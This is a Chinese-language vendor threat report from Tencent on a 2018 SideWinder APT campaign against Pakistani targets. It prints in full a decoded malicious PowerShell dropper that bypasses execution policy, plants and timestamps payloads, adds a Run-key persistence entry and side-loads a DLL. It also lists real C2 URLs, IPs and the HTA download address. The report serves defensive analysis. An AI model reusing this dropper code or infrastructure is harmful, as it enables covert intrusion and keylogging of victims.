# Reference for threat actor for "SideWinder, Rattlesnake"

**Title**: SideWinder“响尾蛇”APT组织（T-APT-04)：针对南亚的定向攻击威胁

**Source**: https://s.tencent.com/research/report/479.html

## Content
SideWinder“响尾蛇”APT组织（T-APT-04)：针对南亚的定向攻击威胁 产品中心产品中心基础安全T-Sec 主机安全容器安全服务 TCSST-Sec Web应用防火墙T-Sec 云防火墙T-Sec 安全运营中心T-Sec iOA零信任安全管理系统业务安全T-Sec 天御 验证码T-Sec 天御 文本内容安全T-Sec 天御 视频内容安全T-Sec 全栈式风控引擎T-Sec 手游安全T-Sec 小程序安全T-Sec 应用合规平台数据安全T-Sec 堡垒机T-Sec 数据安全审计T-Sec 云访问安全代理T-Sec 凭据管理系统T-Sec 密钥管理系统T-Sec 云加密机T-Sec 数据安全治理中心安全服务T-Sec 安全专家服务一站式等保服务T-Sec 安全托管服务渗透测试服务应急响应服务重要时期安全保障服务安全攻防对抗服务了解全部安全产品→解决方案解决方案通用解决方案等保合规安全解决方案直播安全解决方案数据安全解决方案品牌保护解决方案高防云主机安全解决方案腾讯安心平台解决方案行业场景方案游戏安全场景方案电商安全场景方案智慧零售场景方案智慧出行场景方案安全专项解决方案勒索病毒专项解决方案重大保障安全解决方案 NEW 最新动态威胁研究合作伙伴更多更多关于我们腾讯安全介绍荣誉认证帮助中心帮助文档考试认证在线课堂证书查询联系我们产品方案咨询寻求市场合作友情链接腾讯云未登录登录可以享受精准服务推荐线上快捷下单海量资源流量立即登录威胁研究正文SideWinder“响尾蛇”APT组织（T-APT-04)：针对南亚的定向攻击威胁2018-05-23 06:58:59近日腾讯御见威胁情报中心捕获到了SideWinder”响尾蛇”APT组织的一个最新攻击样本，该APT组织疑似来自印度，最早活跃可追溯到2012年。主要针对巴基斯坦等南亚国家的军事目标进行定向攻击。
1、 概况


         近日腾讯御见威胁情报中心捕获到了SideWinder”响尾蛇”APT组织的一个最新攻击样本，该APT组织疑似来自印度，最早活跃可追溯到2012年。主要针对巴基斯坦等南亚国家的军事目标进行定向攻击。









本次捕获的诱饵文档中的关键字主要有“Government of Pakistan
Economic Affairs Division”(巴基斯坦政府经济事务部)、“2018
bilateral training programme plan for pakistan in china”（2018巴基斯坦双边培训计划），因此我们推测此次主要是在对南亚进行定向攻击。


         





（图1 攻击流程图）


2、载荷投递


         该组织使用了一份名为《2018 Bilateral Training in
China.doc》的诱饵文档进行载荷投递。该文档使用了CVE-2017-11882漏洞。当漏洞触发后，公式编辑器进程中的shellcode会将命令行改为“caller.exe
http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta”，接着shelloce会调用mshtml.dll中RunHTMLApplication，RunHTMLApplication会调用GetCommandLineW API取出命令行中的url,从而将final.hta中的脚本给执行起来。









（图2诱饵文档）









（图3：修改原始命令行）









（图4：执行mshtml.RunHTMLApplication）









（图5：final.hta部分内容）





         Final.hta中的脚本会调用powershell.exe将脚本中存储的rat释放到“C:\ProgramData\cmdl32\Update”目录，并将rat给执行起来。








（图6：加密的powershell 命令行）





Powershell中的base64编码的脚本功能主要是释放木马到C:\ProgramData\cmdl32\Update目录，创建开机自启动项，并执行木马文件。加密的Poweshell命令行解码后明文如下：





Set-ExecutionPolicy -ExecutionPolicy Bypass
-Scope CurrentUser -Force;


$ErrorActionPreference='SilentlyContinue';





$pname36 = "3" + "60Tr"
+ "ay"


$binDir = $env:PROGRAMDATA +
"\cmdl32\Updater\";


try{


$cmdLine = ([int]$c).toString("00000000")+([int]$m).toString("00000000");


$cmdLine = "cliconfig32.exe "
+$cmdLine;


}


catch{


$cmdLine = "cliconfig32.exe";


}


$line = new-object byte[] 64;


$buf6 =[Byte[]] (,0x23 * 64);


$cbytes =
[system.Text.Encoding]::ASCII.GetBytes($cmdLine);


[array]::copy($cbytes,$line,$cbytes.length);





$binPath = $binDir +
"cliconfig32.exe";


$binPathdll = $binDir +
"cmpbk32.dll";


$dmybinPath = $binDir +
"cmdl32.exe";


$rpcdllpath = $binDir +
"C39E343F.dll";


$run = 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run\';


$system = 'HKCU:Software\Updater';


$runExists = False;


$pnameavr = "av" + "gn"
+ "t";


$msvbvmdllpath = $env:WINDIR +
"\system32\msvbvm60.dll"


$cmdl32path = $env:WINDIR +
"\system32\cmdl32.exe"





$q36 = Get-Process $pname36 -ErrorAction
SilentlyContinue;


if($q36){


         exit


}





function dc($s){


         sal
n New-Object;


         $data
= [System.Convert]::FromBase64String("H4sIAAAAAAA" + $s);


         $ms
= n System.IO.MemoryStream;


         $ms.Write($data,
0, $data.Length);


         $ms.Seek(0,0)
| Out-Null;


         return
(n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms,
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();


};





function updt($t, $b){


         (ls
$t).LastWriteTime =  (ls
$b).LastWriteTime


         (ls
$t).CreationTime = (ls $b).CreationTime


         (ls
$t).LastAccessTime = (ls $b).LastAccessTime


}





function wb64($path, $b64){


         $bytes
= [System.Convert]::FromBase64String("TVq" + $b64);


         New-Item
-ItemType Directory -Force -Path $binDir | Out-Null;


         [io.file]::WriteAllBytes($path,$bytes)
| Out-Null;


         updt
-t $path -b $cmdl32path


}





function sb($h, $n ) {


    $len = $n.length;


    $limit = $h.length - $len;


    For( $i = 0;  $i -le $limit;  $i++ ) {


        $k = 0;


        For( ;  $k -lt $len;  $k++ ) {


            if( $n[$k] -ne $h[$i+$k] ) {break};


        }


        if( $k -eq $len ){return $i};


    }


    return -1;


}





if((Test-Path $env:WINDIR\SysWOW64)){


         $msvbvmdllpath
= $env:WINDIR + "\SysWOW64\msvbvm60.dll"


         $cmdl32path
= $env:WINDIR + "\SysWOW64\cmdl32.exe"


}





try{


         if(!(Test-Path
$binPath)){





                   $b64
= dc -s ((Get-ItemProperty -Path $system).part1);


                   $bytes
= [System.Convert]::FromBase64String("TVq" + $b64);


                   $rn
= [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum
1111))[0..1];


                   [array]::copy($rn,0,$bytes,$bytes.length
- 2,2);


                   New-Item
-ItemType Directory -Force -Path $binDir | Out-Null;


                   [io.file]::WriteAllBytes($binPath,$bytes)
| Out-Null;


                   updt
-t $binPath -b $cmdl32path





                   $b64dll
= dc -s ((Get-ItemProperty -Path $system).part2);


        $bytes = [System.Convert]::FromBase64String("TVq" + $b64dll);


                   [array]::copy($line,0,$bytes,(sb
-h $bytes -n $buf6),64);


                   New-Item
-ItemType Directory -Force -Path $binDir | Out-Null;


                   [io.file]::WriteAllBytes($binPathdll,$bytes)
| Out-Null;


                   updt
-t $binPathdll -b $cmdl32path


         }





         Remove-Item
-Path $system | Out-Null;


         Remove-Item
$PROFILE.CurrentUserAllHosts | Out-Null;


         New-ItemProperty
-Path $run -Name "Winsound" -PropertyType String -Value $dmybinPath |
Out-Null;


         


         Copy-Item  $msvbvmdllpath $rpcdllpath


         updt
-t $rpcdllpath -b $msvbvmdllpath





         Copy-Item
$cmdl32path $dmybinPath


         updt
-t $dmybinPath -b $cmdl32path





         $avr
= Get-Process $pnameavr -ErrorAction SilentlyContinue


         if
(!$avr) {


                   &($dmybinPath)
| Out-Null;


         }


         Exit


}


catch {


         $_.Exception.Message
| Out-Null;


}












（图7：最终的木马文件）


3、 RAT（Remote Access
Trojan，远程访问木马）分析


1. cmpbk32.dll 行为分析


上文中的脚本最终会将cmdl32.exe执行起来，cmdl32.exe为微软的系统文件，该exe依赖cmpbk32.dll，此处使用了白利用技术。cmpbk32.dll为恶意木马文件，cmpbk32.dll执行时会将cliconfig32.exe给执行起来。












（图8：cmdl32.exe文件信息）






（图9：cmpbk32.dll）





2. cliconfig32.exe 行为分析


木马的核心功能都在cliconfig32.exe中，该exe为vb语言编写，依赖C39E343F.dll。C39E343F.dll其实为微软的正常系统文件MSVBVM60.DLL。









（图10：C39E343F.dll文件信息）












（图11：cliconfig32.exe 主要类信息）









cliconfig32.exe会通过读注册表的方式获取系统的ProductId、DigitalProductId、时区、cpu等信息。









（图12：获取ProductId等信息）












（图13：获取时区信息）


接着会调用RC4类中的解密函数，对资源中的木马配置信息进行解密，再调用MemoryStream中的序列化函数解析配置信息中的各个字段。最终会将木马配置信息存储在HKEY_CURRENT_USER\Software\WinSound注册表项。









（图14：读取资源）









（图15：解密后的配置信息）


配置信息中的部分明文字符串信息如下如示，从而可以确定该木马主要是一款后门木马，基本功能可能有文件和注册表操作、创建进程等。









（图16：dump到的明文配置信息）





C2相关的明文配置信息如下所示：


http://s2.cdn-edge.net/checkout.php


http://s2.cdn-edge.net/cart.php


http://s2.cdn-edge.net/amount.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/checkout.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/cart.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/amount.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/checkout.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/cart.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/amount.php





http://ap12.ms-update-server.net/checkout.php


http://ap12.ms-update-server.net/cart.php


http://ap12.ms-update-server.net/amount.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/checkout.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/cart.php


http://%wn34%wn%wh2%wh%wn738%wn.net/v3/amount.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/checkout.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/cart.php


http://%dn34%dn%dh2%dh%dn738%dn.net/v3/amount.p





 木马会安装键盘和鼠标钩子记录键盘按键，并存储在C:\ProgramData\w32k.dat，并将其它收集的系统信息（包括并不仅限于CPU、计算机名、磁盘大小等信息）存储在C:\ProgramData\Tmp目录，然后调用WebClient类中的DoGet、DoPost函数将文件中收集的信息发送给c2。在文件存储和读取时使用的类分别是CryptoFileWriter和CryptoFileReader，上传文件时使用类为 FilePoster









（图17：安装键盘钩子）









（图18：安装鼠标钩子）









（图19：http post时的参数）












       （图20：收集的信息：包括并不仅限于CPU、计算机名、磁盘大小等）





4、总结


         从上文的分析可以看出，该组织将cve-2017-11882漏洞与RunHTMLApplication后门技术相结合，技术功底深厚。同时利用纯vb语言编写木马，再结合白利用技术，大大增加了后门木马的检出和逆向分析难度。从信息收集、明文字符串加解密、木马功能函数等方面可以看出该木马版本已趋于稳定。因此，我们提醒政府、企业等广大用户，切勿随意打开来历不明的文档，同时安装安全软件。


目前，腾讯御界高级威胁检测系统已经可以检测并阻断该轮攻击的连接行为。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。


凭借基于行为的防护和智能模型两大核心能力，御界高级威胁检测系统可高效检测未知威胁，并通过对企业内外网边界处网络流量的分析，感知漏洞的利用和攻击。通过部署御界高级威胁检测系统，及时感知恶意流量，检测钓鱼网址和远控服务器地址在企业网络中的访问情况，保护企业网络安全。












（图21：御界APT威胁检测）


附录（IOCs）


Md5:


3cd725172384297732222ef9c8f74adc(doc)


c0f15436912d8a63dbb7150d95e6a4ee(doc)


dbb45a0839719312f248351e3fb9a0ae(cmdl32.exe)


de7f526d4f60b59bb1626770f329f984(cmpbk32.dll)


204860ce22c81c6d9de763c09e989a20(cliconfig32.exe)


5343a19c618bc515ceb1695586c6c137(c39e343f.dll)


fe2d78d90cea90477776a36fd8e57deb(cliconfig32.exe)
f03c0390d0a655450f1b10ea4057b06e(cmpbk32.dll) 








C2:


http://s2.cdn-edge.net/checkout.php


http://s2.cdn-edge.net/cart.phpB


http://s2.cdn-edge.net/amount.php


37.139.29.117





http://ap12.ms-update-server.net/checkout.php


http://ap12.ms-update-server.net/cart.php


http://ap12.ms-update-server.net/amount.php


188.241.68.144


url:


http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta


http://fb-dn.net/disrt/fin.hta





关键路径：


C:\ProgramData\cmdl32\Updater


C:\ProgramData\wk32.dat


C:\ProgramData\Tmp


C:\ProgramData\cmdl32\Updater\ wk32.dat


注册表：


HKEY_CURRENT_USER\Software\WinSound



产品方案 产品中心威胁研究威胁通告研究报告合作伙伴合作伙伴详情其他腾讯安全介绍新闻活动在线课堂友情链接腾讯云腾讯安全公众号腾讯安全视频中心Copyright©1998-2024 Tencent. All Rights Reserved.在线咨询方案定制